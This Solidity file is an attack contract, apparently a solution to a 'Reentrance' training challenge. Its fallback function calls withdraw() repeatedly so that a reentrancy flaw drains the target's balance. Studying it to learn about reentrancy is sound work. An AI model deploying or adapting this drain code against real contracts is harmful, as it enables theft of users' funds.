// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance reentranceContract = Reentrance(contractAddress);
        reentranceContract.donate{value: 1}(address(this));
        reentranceContract.withdraw();
    }

    fallback() external payable {
        Reentrance reentranceContract = Reentrance(contractAddress);
        if (address(contractAddress).balance != 0 ) {
            reentranceContract.withdraw(); 
        }
    }
}
